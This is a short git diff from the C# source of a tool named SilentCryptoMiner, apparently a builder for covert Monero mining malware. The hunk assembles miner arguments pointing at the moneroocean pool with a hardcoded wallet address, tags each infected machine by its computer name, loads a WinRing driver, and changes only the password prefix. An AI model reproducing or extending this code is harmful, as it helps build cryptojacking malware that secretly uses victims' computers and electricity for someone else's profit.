@@ -148,7 +148,7 @@ namespace SilentCryptoMiner
 
                     if (xmr)
                     {
-                        argstr.Append($"--algo=rx/0 {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --url=gulf.moneroocean.stream:20128 --user=\"84AU5PjmTtYfp9SHxNLiE3aGsVw7tkKpX3EsgskWQW4FQ4KHSUMgLSNRKzkBXpiqrsFvpt65ndptz6LPHSRNQ6HgLTaNXik\" --pass=\"{{COMPUTERNAME}}\" --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))} --cinit-winring=\"{winringName}\" --randomx-no-rdmsr --tls");
+                        argstr.Append($"--algo=rx/0 {(miner.chkAdvParam.Checked ? miner.txtAdvParam.Text : "")} --url=gulf.moneroocean.stream:20128 --user=\"84AU5PjmTtYfp9SHxNLiE3aGsVw7tkKpX3EsgskWQW4FQ4KHSUMgLSNRKzkBXpiqrsFvpt65ndptz6LPHSRNQ6HgLTaNXik\" --pass=\"Githb-SCM-{{COMPUTERNAME}}\" --cpu-max-threads-hint={Invoke(new Func<string>(() => miner.comboMaxCPU.Text.Replace("%", "")))} --cinit-winring=\"{winringName}\" --randomx-no-rdmsr --tls");
                     }
                     else
                     {
